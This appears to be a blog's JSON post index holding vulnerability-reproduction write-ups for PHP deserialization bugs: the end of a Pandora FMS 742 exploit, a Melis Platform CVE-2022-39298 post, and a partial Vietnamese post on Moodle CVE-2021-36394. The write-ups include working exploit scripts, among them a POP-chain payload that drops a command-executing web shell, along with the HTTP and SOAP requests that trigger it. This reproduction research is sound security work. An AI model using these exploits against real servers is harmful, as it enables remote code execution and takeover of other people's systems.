\\\u0026#39;1\\\u0026#39;,0,\\\u0026#39;\u0026#39; . $encodedData . \u0026#39;\\\u0026#39; as data#\u0026#39;); $response = httpPost($url, $data); // var_dump($response); // Extract session ID from response headers echo \u0026#34;[+] Extracting PHPSESSID...\u0026#34;; preg_match(\u0026#39;/PHPSESSID=([^\\s;]+)/\u0026#39;, $response, $matches); if (isset($matches[1])) { $sessionId = $matches[1]; echo \u0026#34;[+] PHPSESSID = \u0026#34; . $sessionId . PHP_EOL; // Trigger payload echo PHP_EOL . \u0026#34;[+] Triggering payload...\u0026#34; . PHP_EOL; $url = $host . \u0026#34;/pandora_console/ws.php\u0026#34;; $status = httpGet($url, $sessionId); if ($status) { echo \u0026#34;[+] Exploit successful. Your shell is located at: \u0026#34; . $host . \u0026#34;/pandora_console/shell.php\u0026#34; . PHP_EOL; } else { echo \u0026#34;Exploit failed.\u0026#34; . PHP_EOL; } } } if ($argc \u0026lt; 2) { die(\u0026#34;Usage: php exploit.php \u0026lt;url\u0026gt;\\n\u0026#34;); } $url = $argv[1]; echo \u0026#34;Running exploit on $url\\n\u0026#34;; exploit($url); ?\u0026gt; IV References https://github.com/CFandR-github/advisory/blob/main/phpmailer_rce_poi/phpmailer_unserialize_rce_0day.md https://github.com/ambionics/phpggc https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/ Joomla! CMS 3.0~3.4.6 RCE - 12138\u0026rsquo;s Blog (144.one) ","description":"Continuing from the previous series of articles, in this post, I will apply the knowledge I have acquired and conduct further research on PHP deserialization in order to reproduce an intriguing bug: going from SQL injection to PHP deserialization and achieving Remote Code Execution (RCE) on Pandora FMS 742.","id":5,"section":"posts","tags":["php"],"title":"From SQLi to PHP deserialize to RCE on Pandora FMS 742","uri":"https://minhlongmt183.github.io/posts/from_sqli_to_php_deserialize_to_rce_on_pandora_fms/"},{"content":"Reproduce bug: Remote Code Execution in Melis Platform Continuing from the previous article series, in this post, I will apply the knowledge learned and research on PHP deserialize to reproduce CVE-2022-39298\nThere is currently no POC code available on this internet for this CVE, but there is a blog post discussing it: Remote Code Execution in Melis Platform | Sonar (sonarsource.com) This blog is based on the blog Remote Code Execution in Melis Platform | Sonar (sonarsource.com) and will be written in my own understanding. I Building environment What is melis-framework?\nMelis Framework is an open-source PHP web application framework for building custom, modular, and scalable e-commerce solutions. It is based on the Laminas Framework (formerly known as the Zend Framework) and provides additional modules and tools to make it easier to develop e-commerce applications.\nMelis Framework features a powerful and flexible content management system, which allows developers to create custom pages, blocks, and widgets. It also includes a robust shopping cart system with support for multiple payment gateways, shipping providers, and tax rates. Additionally, it offers various integrations such as social media, mailing list services, and Google Analytics.\nMelis Framework uses the Model-View-Controller (MVC) architecture and relies on the Composer dependency management system to manage packages and libraries. It is highly customizable and extensible, allowing developers to add their own modules, themes, and plugins to meet specific project requirements.\nOne of the most challenging issues I find when reproducing this CVE related to this framework is having to rebuild the environment, which takes a considerable amount of time and effort.\nAfter spending a few days searching for many sources of information on the internet (in fact, there are not many resources discussing this issue), I found that the best way is to follow the step-by-step video instructions on the website Download \u0026amp; Documentation (melistechnology.com. However, there is a difficulty that the website only provides installation instructions for the next step on the Windows platform, while I am using it on the Linux environment.\nI noticed that there was a section in the guide for building docker-compose. Therefore, I decided to read the contents the docker-compose.yml file, make some modifications to build it locally.\nThe important notice here is that during setup, at the final step, it is advisable to follow the video tutorial to create a sample site. This helps us save time in triggering the vulnerability.\nII Vulnerability identification At melis-front/src/Controller/MelisPluginRendererController.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 class MelisPluginRendererController extends MelisAbstractActionController { public function getPluginAction() { // [...] $post = $this-\u0026gt;getRequest()-\u0026gt;getPost()-\u0026gt;toArray(); // [1] $pluginHardcodedConfig = array(); if (!empty($post[\u0026#39;pluginHardcodedConfig\u0026#39;])) { $pluginHardcodedConfig = $post[\u0026#39;pluginHardcodedConfig\u0026#39;]; // [2] $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES); $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES); $pluginHardcodedConfig = unserialize($pluginHardcodedConfig); // [3] At line 13, the unserialize() function is called with the parameter $pluginHardcodedConfig which is obtained from $post (at line 6).\nThe class MelisPluginRendererController is extended from MelisAbstractActionController class which is located in Laminas\\Mvc\\Controller\\AbstractActionController.\nFrom this, we can infer the framework being used is Lamimas. The Laminas\\Mvc\\Controller::getRequest() method returns an object of type Laminas\\Http\\Request. This object has a getPost()-\u0026gt;toArray() method which retrieves the POST data and stores it in $post (at line 6). An attacker can control the value of this variable.\nIII Finding source from sink Tracing the sink, I found that it is related to the file module.config.php in melis-platform.\nThe source code of vendor/melisplatform/melis-front/src/Controller/MelisPluginRendererController.php shows that:\nThis bug relates to a plugin. This Framework is built following the MVC model. trên trang document của melis, có 1 trang webdemo\nOn the Melis documentation page, there is a web demo and a sample config page.\nFrom here, I realize that the vulnerability occurred on the website hosted on the Melis framework, but what I am doing is looking for the bug on the Melis framework, which is the wrong direction. 😔😔😔\nTherefore, the next step is to create a website hosted on the Melis-framework like the sample site on the local machine.\nAfter a day of research, I found out the cause of the issue. During the installation process, there was an option to install with a demo version. After installing, all I need to do is access the demo website, and the plugin will automatically trigger.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 POST /news/id/2 HTTP/1.1 Host: www.mysite.local User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://www.mysite.local/melis Cookie: PHPSESSID=dhd40qdsqb3goj8lkmausre78d; show_bubble_plugins=true; dashboard_notify=false Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 pluginHardcodedConfig=Ediscxxxxxx And at this point, we can also control any value passed into the unserialize() function, which is enough to move on to the next phase.\nIV Building a POP chain There is a paper discussing this exploitation technique.\ndahse2014 (1).pdf\nSupporting tool - PHPGGC PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don\u0026rsquo;t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of frohoff\u0026rsquo;s ysoserial, but for PHP. Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.\nlink: https://github.com/ambionics/phpggc PHPGCC includes a chain that allows deleting any file. 1 2 3 4 5 6 7 ./phpggc -i Laminas/FD1 Name : Laminas/FD1 Version : \u0026lt;= 2.11.2 Type : File delete Vector : __destruct ./phpggc Laminas/FD1 \u0026lt;remote_path\u0026gt; But the impact causes is too too significant and destructive for organizations. As a pentester, we need to find other chains that have less impact.\nFinding new chain The author’s experience with unserialize shows that the caching systems are suitable targets for attacks and control. Because most applications tend to trust the content from the cache. The application uses laminas/laminas-cache as a third-party dependency, which supports various backend storage features such as apcu, blackhole, mongodb, filesystem, memcached, memory, redis and session. After going through the classes, the author found a comment in the code 1 Saves any deferred items that have not been committed At laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php namespace Laminas\\Cache\\Psr\\CacheItemPool; # [...] class CacheItemPoolDecorator implements CacheItemPoolInterface { /** * Destructor. * * Saves any deferred items that have not been committed */ public function __destruct() { $this-\u0026gt;commit(); } This means that there must be some way to use this class to store new items in the cache.\nGo deeper into the commit() function at vendor/laminas/laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 public function commit() { $notSaved = []; foreach ($this-\u0026gt;deferred as \u0026amp;$item) { if (! $this-\u0026gt;save($item)) { $notSaved[] = $item; } } $this-\u0026gt;deferred = $notSaved; return empty($this-\u0026gt;deferred); } It is easy to notice that all values of $this-\u0026gt;deferred are saved to cache by the $this-\u0026gt;save() function (lines 5-9) Go deeper into the $this-\u0026gt;save() function\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public function save(CacheItemInterface $item) { if (! $item instanceof CacheItem) { throw new InvalidArgumentException(\u0026#39;$item must be an instance of \u0026#39; . CacheItem::class); } $itemTtl = $item-\u0026gt;getTtl(); // delete expired item if ($itemTtl \u0026lt; 0) { $this-\u0026gt;deleteItem($item-\u0026gt;getKey()); $item-\u0026gt;setIsHit(false); // không có trong cache return false; } $saved = true; $options = $this-\u0026gt;storage-\u0026gt;getOptions(); $ttl = $options-\u0026gt;getTtl(); try { // get item value and serialize, if required $value = $item-\u0026gt;get(); // reset TTL on adapter, if required if ($itemTtl \u0026gt; 0) { $options-\u0026gt;setTtl($itemTtl); } $saved = $this-\u0026gt;storage-\u0026gt;setItem($item-\u0026gt;getKey(), $value); // saved items are a hit? see integration test CachePoolTest::testIsHit() $item-\u0026gt;setIsHit($saved); } catch (Exception\\InvalidArgumentException $e) { throw new InvalidArgumentException($e-\u0026gt;getMessage(), $e-\u0026gt;getCode(), $e); } catch (Exception\\ExceptionInterface $e) { $saved = false; } finally { $options-\u0026gt;setTtl($ttl); } return $saved; } The code line $saved = $this-\u0026gt;storage-\u0026gt;setItem($item-\u0026gt;getKey(), $value);is used to save the value to the filesystem storage backend, and since we can control all variables of deserialized classes, we can point the filesystem storage to any file on the local disk and write to it.\nĐiều này có thể bị khai thác bằng cách tạo một kịch bản PHP trên đĩa, có thể được thực thi trực tiếp bởi trình thông dịch. Miễn là tập lệnh có phần mở rộng .php và bắt đầu bằng \u0026lt;?php, bất kỳ dữ liệu nào trước nó đều bị bỏ qua và trình thông dịch PHP sẽ thực thi tập lệnh.\nThis can be exploited by creating a PHP script on disk that can be directly executed by the interpreter. As long as the script has .php extension and starts with \u0026lt;?php, any data before it will be ignored, and the PHP interpreter will execute the script.\nWorkflow (from Remote Code Execution in Melis Platform | Sonar (sonarsource.com))\nMy Exploit This is the code I’ve written to exploit this vulnerability\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 \u0026lt;?php namespace Laminas\\Cache\\Psr\\CacheItemPool { class CacheItemPoolDecorator{} class CacheItem{} } namespace Laminas\\Cache\\Storage\\Adapter { class Filesystem{} class FilesystemOptions{} } namespace { function httpPost($url, $data) { $curl = curl_init($url); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_HEADER, true); curl_setopt($curl, CURLOPT_POSTFIELDS, $data); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy printf($curl); $response = curl_exec($curl); // var_dump($response); curl_close($curl); return $response; } function pwn($url, $param){ $shell = \u0026#39;\u0026lt;?php if(isset($_GET[\\\u0026#39;cmd\\\u0026#39;])) { system($_GET[\\\u0026#39;cmd\\\u0026#39;]); } ?\u0026gt;\u0026#39;; $cache_item = new Laminas\\Cache\\Psr\\CacheItemPool\\CacheItem; $cache_item-\u0026gt;key=\u0026#34;shell\u0026#34;; $cache_item-\u0026gt;value=$shell; $payload = new Laminas\\Cache\\Psr\\CacheItemPool\\CacheItemPoolDecorator; $payload-\u0026gt;storage = new Laminas\\Cache\\Storage\\Adapter\\Filesystem; $payload-\u0026gt;storage-\u0026gt;options = new Laminas\\Cache\\Storage\\Adapter\\FilesystemOptions; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; cacheDir = \u0026#34;/var/www/html/public\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; dirLevel = 0; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; suffix = \u0026#34;php\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; namespace = \u0026#34;\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; keyPattern = \u0026#34;/.*/\u0026#34;; $payload-\u0026gt;deferred = array($cache_item); $data = \u0026#34;pluginHardcodedConfig=\u0026#34;.serialize($payload); // print($data); echo \u0026#34;\\n [*] Inject Payload \u0026#34;.$data; httpPost($url,$data); echo \u0026#34;\\n\\n\\n [*] Successful!\u0026#34;; } // Exploit Main // $url = $argv[1]; $url = \u0026#34;http://www.mysite.local/news/id/2\u0026#34;; $param = \u0026#34;Hacked: by0d0ff9\u0026#34;; pwn($url, $param); } ?\u0026gt; POC\nV References Remote Code Execution in Melis Platform | Sonar (sonarsource.com) dahse2014 (1).pdf\nCode Reuse Attacks in PHP | Proceedings of the 2014 ACM SIGSAC Conference on Computer and Communications Security Download \u0026amp; Documentation (melistechnology.com) https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laminas/FD/1 ","description":"Continuing from the previous article series, in this post, I will apply the knowledge learned and research on PHP deserialize to reproduce CVE-2022-39298.","id":6,"section":"posts","tags":["php"],"title":"Reproduce bug: Remote Code Execution in Melis Platform","uri":"https://minhlongmt183.github.io/posts/reproduce-bug-remote-code-execution-in-melis-platform/"},{"content":"CVE 2021-36394 - moodle Long time no see!\nĐợt này tôi có cơ hội làm việc, nghiên cứu về các CVE liên quan đến PHP. Một trong những lỗi tôi làm đầu tiên liên quan đến PHP-deserialize.\nĐây là một mảng kiến thức mới mà tôi được tiếp cận. Phương pháp ở đây là tôi sẽ tìm hiểu các kiến thức liên quan đến PHP-deserialize, làm một vài ví dụ, tìm hiểu các hàm hay bị lỗi! Sau đó, ta bắt đầu vào CVE của mình.\nKiến thức cơ bản của PHP deserialize có thể dễ dàng tìm kiếm trên Payload All Things.\nSau đó, tôi tình cờ thấy blog viết về cách khai thác PHP deserialize về moodle! Lỗ hổng này đã có bài viết, POC, các tài liệu liên quan\u0026hellip; Đây là một CVE lí tưởng để tôi bắt đầu học!\nBài này, tôi sẽ trình bày lại theo cách hiểu của tôi.\nNgữ cảnh Moodle bật shibboleth plugin Version bị lỗi: 3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions Chi tiết lỗ hổng Nhận diện lỗ hổng Đọc bài blog, ta biết được sink nằm ở đường dẫn auth/shibboleth/classes/helper.php, cụ thể ở hàm logout_file_session 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public static function logout_file_session($spsessionid) { global $CFG; if (!empty($CFG-\u0026gt;session_file_save_path)) { $dir = $CFG-\u0026gt;session_file_save_path; } else { $dir = $CFG-\u0026gt;dataroot . \u0026#39;/sessions\u0026#39;; } if (is_dir($dir)) { if ($dh = opendir($dir)) { // Read all session files. while (($file = readdir($dh)) !== false) { // Check if it is a file. if (is_file($dir.\u0026#39;/\u0026#39;.$file)) { // Read session file data. $data = file($dir.\u0026#39;/\u0026#39;.$file); if (isset($data[0])) { $usersession = self::unserializesession($data[0]); // Check if we have found session that shall be deleted. if (isset($usersession[\u0026#39;SESSION\u0026#39;]) \u0026amp;\u0026amp; isset($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id)) { // If there is a match, delete file. if ($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id == $spsessionid) { // Delete session file. if (!unlink($dir.\u0026#39;/\u0026#39;.$file)) { return new SoapFault(\u0026#39;LogoutError\u0026#39;, \u0026#39;Could not delete Moodle session file.\u0026#39;); } } } } } } closedir($dh); } } } Question: Nếu ngữ cảnh 1day thì sao? làm sao biết được endpoint này? Ans:\nTrên trang thông báo của Moodle có thông báo về lỗ hổng Moodle.org: MSA-21-0022: Remote code execution risk when Shibboleth authentication is enabled\nTừ trang này dẫn tới repo github của moodle khi commit để fix code\nOfficial Moodle git projects - moodle.git/search\nSử dụng tính năng commit diff sẽ thấy hàm bị lỗi nằm ở /[auth/shibboleth/classes/helper.php](https://git.moodle.org/gw?p=moodle.git;a=blob;f=auth/shibboleth/classes\u0026gt; /helper.php;h=0e99d199957509a35d259704d3ee08e313aed510;hb=5bc561ee7ad31b769815821280f8a3f5bd69c31b)\nHàm này sẽ thực hiện các bước sau\nLấy địa chỉ thư mục lưu các session, đường dẫn là $CFG-\u0026gt;dataroot/sessions/\n1 2 3 4 5 if (!empty($CFG-\u0026gt;session_file_save_path)) { $dir = $CFG-\u0026gt;session_file_save_path; } else { $dir = $CFG-\u0026gt;dataroot . \u0026#39;/sessions\u0026#39;; } Đọc nội dung file trong thư mục trên và thực hiện hàm self::unserializesession trên từng nội dung\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 if (is_dir($dir)) { if ($dh = opendir($dir)) { // Read all session files. while (($file = readdir($dh)) !== false) { // Check if it is a file. if (is_file($dir.\u0026#39;/\u0026#39;.$file)) { // Read session file data. $data = file($dir.\u0026#39;/\u0026#39;.$file); if (isset($data[0])) { $usersession = self::unserializesession($data[0]); // Check if we have found session that shall be deleted. if (isset($usersession[\u0026#39;SESSION\u0026#39;]) \u0026amp;\u0026amp; isset($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id)) { // If there is a match, delete file. if ($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id == $spsessionid) { // Delete session file. if (!unlink($dir.\u0026#39;/\u0026#39;.$file)) { return new SoapFault(\u0026#39;LogoutError\u0026#39;, \u0026#39;Could not delete Moodle session file.\u0026#39;); } } } } } } closedir($dh); } } Dòng 8: Chương trình sẽ đọc từng file, lưu giá trị vào biến $data .\nDòng 10 chương trình thực hiện lệnh self::unserializesession()\nHàm unserializesession($serializedstring)\n1 2 3 4 5 6 7 8 9 private static function unserializesession($serializedstring) { $variables = array(); $a = preg_split(\u0026#34;/(\\w+)\\|/\u0026#34;, $serializedstring, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); $counta = count($a); for ($i = 0; $i \u0026lt; $counta; $i = $i + 2) { $variables[$a[$i]] = unserialize($a[$i + 1]); } return $variables; } Dòng 3, chuỗi $serializedstring sẽ bị split bởi pattern /(\\w+)\\|/ để tạo thành 1 mảng các phần tử con.\nVí dụ:\n1 2 $serializedstring = \u0026#39;Hello|world\u0026#39;; ==\u0026gt; a = [\u0026#39;Hello\u0026#39;, \u0026#39;world\u0026#39;] Dòng 4—\u0026gt;7: Từng phần tử của mảng $a truyền vào hàm unserialize().\nKết luận: Mỗi lần người dùng truy cập vào moodle, session đều được lưu lại ở folder $CFG-\u0026gt;dataroot/sessions/ Khi thực hiện hàm logout_file_session(), chương trình đọc lần lượt các file chứa session. Mỗi session sẽ được split thành mảng các phần tử với delimiter là | Từng phần tử sẽ là tham số truyền vào hàm unserialize() Nếu attacker có thể ghi được xuống session thì có thể control được tham số truyền vào unserialize() ⇒ dấu hiệu của lỗi php deserialization\nphp deserialization\nĐể khai thác lỗ hổng php deserialization cần 2 bước chính Control được tham số truyền vào hàm unserialize() Xác định kĩ thuật khai thác, với PHP deserialization kĩ thuật khai thác Property Oriented Programming (POP) thường được sử dụng để khai thác. Khai thác lỗ hổng I. control tham số truyền vào hàm unserialize() Ở phần trước chúng ta đã biết hàm unserialize() sẽ lấy tham số có giá trị từ sesion và session này được đọc lên từ file. Do đó, một hướng để control được input vào hàm unserialize() là tìm cách ghi xuống sesion.\nĐể tìm cách ghi xuống session, trong source code, ta sẽ tìm đến nơi thỏa 2 điều kiện:\nBiến $SESSION được gán giá trị. Thường sẽ có dạng\n1 $SESSION-\u0026gt;field1= var1; Giá trị được gán vào $SESSION được control bởi user, ở đây là var1. Trong PHP, biến được người dùng truyền vào sẽ được thưc thi bởi hàm optional_param() hoặc required_param().\nTôi dùng công cụ grep và comm của ubuntu để giải quyết vấn đề này, cụ thể\n1 2 3 grep -HnrE \u0026#39;\\$SESSION-\u0026gt;\u0026#39; /var/www/html/moodle/ | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; | sort -u \u0026gt; file1.txt grep -HnrE \u0026#39;optional_param\\(|required_param\\(\u0026#39; /var/www/html/moodle/ | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; | sort -u \u0026gt; file2.txt comm -12 file1.txt file2.txt \u0026gt; file3.txt Ý nghĩa của từng câu lệnh thì chỉ là kiến thức cơ bản của linux, google 1 tí là ra 🙂.\nNôm na là tôi tìm các tệp có chứa chuỗi thuộc 2 pattern trên rồi lọc ra các tệp cùng nằm trong 2 file1, file2. Bước này khá rườm ra vì grep không hỗ trợ toán tử AND 2 pattern mà chỉ OR thôi.\nSau khi có file3.txt thì manual vào từng file mà tìm xem có endpoint nào hay không thôi. (Đây là cách của tác giả, cũng là nơi mà chúng ta có thể cải thiện phương pháp hoặc nghiên cứu tìm phương pháp hiệu quả hơn)\nTiến hành đọc, ta tìm được 1 endpoint ở grade/report/grader/index.php, cụ thể:\n1 2 3 4 5 6 7 8 9 10 $graderreportsifirst = optional_param(\u0026#39;sifirst\u0026#39;, null, PARAM_NOTAGS); $graderreportsilast = optional_param(\u0026#39;silast\u0026#39;, null, PARAM_NOTAGS); // The report object is recreated each time, save search information to SESSION object for future use. if (isset($graderreportsifirst)) { $SESSION-\u0026gt;gradereport[\u0026#39;filterfirstname\u0026#39;] = $graderreportsifirst; } if (isset($graderreportsilast)) { $SESSION-\u0026gt;gradereport[\u0026#39;filtersurname\u0026#39;] = $graderreportsilast; } Dòng 6, 9: Giá trị biến $graderreportsifirst và $graderreportsilast được lưu vào session. Dòng 1,2: Giá trị biến $graderreportsifirst và $graderreportsilast được truyền bởi người dùng với 2 param lần lượt sifirst và silast. ⇒ Chúng ta chỉ cần truyền 1 trong 2 param là đủ. Endpoint này unauthenticated Đọc thêm code, dễ dàng biết được format truyền vào\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET /moodle/grade/report/grader/index.php?id=1\u0026amp;sifirst=xxxx|EDISC-here-PAYLOAD|yyyyyyy HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: MoodleSession=4ganll3d78sv5gjlcqqhd1lue0 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Tiến hành chạy và debug, ta xác định được\nđịa chỉ lưu session là /var/www/moodledata/sessions Để dễ debug, ta vào thư mục trên, xóa hết các session đang có và thực hiện request để lưu session Đã viết session thành công, kiểm tra giá trị truyền vào hàm unserialize() Tiến hành debug để kiểm tra xem giá trị có thực sự được đưa vào hàm unserialize() không. Bây giờ, câu chuyện là làm sao để tìm được source để reach tới được sink unserialize() II. Từ source tới sink Ở phần 1 ta đã ghi đè xuống session với giá trị bất kì. Đọc code ta biết được giá trị của mình truyền vào sẽ được truyền vào hàm unserialize()\nTrong phần này ta sẽ tìm source để dẫn tới sink unserialize() để chạy debug, kiểm tra giá trị truyền vào có đúng như dự đoán không và đây cũng là nơi trigger payload exploit.\nSử dụng tính năng Go to references trên vscode, ta dễ dàng tìm được endpoint tại hàm LogoutNotification() tại auth/shibboleth/logout.php\n1 2 3 4 5 6 7 8 9 10 11 12 function LogoutNotification($spsessionid) { $sessionclass = \\core\\session\\manager::get_handler_class(); switch ($sessionclass) { case \u0026#39;\\core\\session\\file\u0026#39;: return \\auth_shibboleth\\helper::logout_file_session($spsessionid); case \u0026#39;\\core\\session\\database\u0026#39;: return \\auth_shibboleth\\helper::logout_db_session($spsessionid); default: throw new moodle_exception(\u0026#34;Shibboleth logout not implemented for \u0026#39;$sessionclass\u0026#39;\u0026#34;); } // If no SoapFault was thrown, the function will return OK as the SP assumes. } Endpoint auth/shibboleth/logout.php có luồng thực thi như sau:\nChương trình lấy 2 tham số action và return từ url và xác định protocol được sử dụng\n1 2 3 4 5 6 7 8 $action = optional_param(\u0026#39;action\u0026#39;, \u0026#39;\u0026#39;, PARAM_ALPHA); $redirect = optional_param(\u0026#39;return\u0026#39;, \u0026#39;\u0026#39;, PARAM_URL); // Find out whether host supports https $protocol = \u0026#39;http://\u0026#39;; if (is_https()) { $protocol = \u0026#39;https://\u0026#39;; } Kiểm tra xem plugin shibboleth có được bật không. (Do đó, ở phần setup môi trường, chúng ta phải bật plugin này lên mới reproduce được)\n1 2 3 4 // If the shibboleth plugin is not enable, throw an exception. if (!is_enabled_auth(\u0026#39;shibboleth\u0026#39;)) { throw new moodle_exception(get_string(\u0026#39;pluginnotenabled\u0026#39;, \u0026#39;auth\u0026#39;, \u0026#39;shibboleth\u0026#39;)); } Lấy giá trị truyền vào $inputstream và kiểm tra câu lệnh rẽ nhánh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // Front channel logout. $inputstream = file_get_contents(\u0026#34;php://input\u0026#34;); if ($action == \u0026#39;logout\u0026#39; \u0026amp;\u0026amp; !empty($redirect)) { if (isloggedin($USER) \u0026amp;\u0026amp; $USER-\u0026gt;auth == \u0026#39;shibboleth\u0026#39;) { // Logout user from application. require_logout(); } // Finally, send user to the return URL. redirect($redirect); } else if (!empty($inputstream)) { // Back channel logout. // Set SOAP header. $server = new SoapServer($protocol.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].$_SERVER[\u0026#39;PHP_SELF\u0026#39;].\u0026#39;/LogoutNotification.wsdl\u0026#39;); $server-\u0026gt;addFunction(\u0026#34;LogoutNotification\u0026#34;); $server-\u0026gt;handle(); } else { // Return WSDL. Vì mục tiêu của chúng ta nằm ở nhánh thứ 2 để gọi hàm LogoutNotification nên chúng ta truyền vào action=logout và $redirect=null (tức là không cần truyền vào). Mọi thứ so easy, nhưng với 1 newbiee PHP như tôi thì SoapServer ở dòng 18 cũng như hàm nhập ở dòng 2 khá lạ lẫm. Do đó trước khi tiếp tục tôi phải đi tìm hiểu SoapServer là gì và truyền giá trị vào $inputstream là gì mới hợp lệ.\n1 2 // Front channel logout. $inputstream = file_get_contents(\u0026#34;php://input\u0026#34;); Nếu ngày xưa chúng ta có câu: “cái gì không biết thì tra google” thì ngày nay trước khi tra google chúng ta có thể đi hỏi anh bạn chatgpt rồi sau đó google để kiểm chứng hiểu rõ hơn chapgpt\nfile_get_contents(\u0026quot;php://input\u0026quot;) là một hàm trong PHP để đọc dữ liệu từ body của HTTP request. Khi bạn gửi một HTTP request từ một client (ví dụ như trình duyệt web) tới một server, nội dung của request được đưa vào body của request.\nTrong PHP, \u0026quot;php://input\u0026quot; là một stream wrapper, cho phép đọc dữ liệu từ body của request bằng cách đọc dữ liệu từ một input stream.\nDo đó, khi sử dụng file_get_contents(\u0026quot;php://input\u0026quot;), bạn đang yêu cầu PHP đọc dữ liệu từ body của request và trả về dữ liệu dưới dạng một chuỗi (string). Bạn có thể sử dụng kết quả này để xử lý dữ liệu của request trong ứng dụng PHP của mình.\nDễ hiểu đây là cách để đọc giá trị thôi, vào để truyền bằng RESTAPI thì ta cần dùng POST method Còn với soap thì tôi đọc trên w3schools: https://www.w3schools.com/xml/xml_soap.asp Về cơ bản, XML SOAP (Simple Object Access Protocol) là một chuẩn giao thức được sử dụng để trao đổi dữ liệu giữa các ứng dụng phần mềm khác nhau. Nó sử dụng ngôn ngữ XML để mã hóa dữ liệu và các thông điệp truyền tải giữa các hệ thống khác nhau thông qua giao thức HTTP hoặc các giao thức khác. Đọc hiểu 1 tí, ta có thể xác định được payload truyền vào là 1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\u0026lt;SOAP-ENV:Body\u0026gt; \u0026lt;LogoutNotification\u0026gt; \u0026lt;spsessionid\u0026gt;sssssu\u0026lt;/spsessionid\u0026gt; \u0026lt;/LogoutNotification\u0026gt; \u0026lt;/SOAP-ENV:Body\u0026gt;\u0026lt;/SOAP-ENV:Envelope\u0026gt; Trong đó, \u0026lt;LogoutNotification\u0026gt; là request chúng ta muốn gọi và \u0026lt;spsessionid\u0026gt; là tham số của function này\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /******************************************************************************/ /** * Handles SOAP Back-channel logout notification * * @param string $spsessionid SP-provided Shibboleth Session ID * @return SoapFault or void if everything was fine */ function LogoutNotification($spsessionid) { $sessionclass = \\core\\session\\manager::get_handler_class(); switch ($sessionclass) { case \u0026#39;\\core\\session\\file\u0026#39;: return \\auth_shibboleth\\helper::logout_file_session($spsessionid); case \u0026#39;\\core\\session\\database\u0026#39;: return \\auth_shibboleth\\helper::logout_db_session($spsessionid); default: throw new moodle_exception(\u0026#34;Shibboleth logout not implemented for \u0026#39;$sessionclass\u0026#39;\u0026#34;); } // If no SoapFault was thrown, the function will return OK as the SP assumes. } Truyền payload và kiểm tra input của hàm unserialize()\nNhư vậy, để control input vào hàm unserialize() chúng ta cần 2 payload\npayload1: method GET, mục tiêu viết payload xuống session payload2: method POST, mục tiêu trigger payload 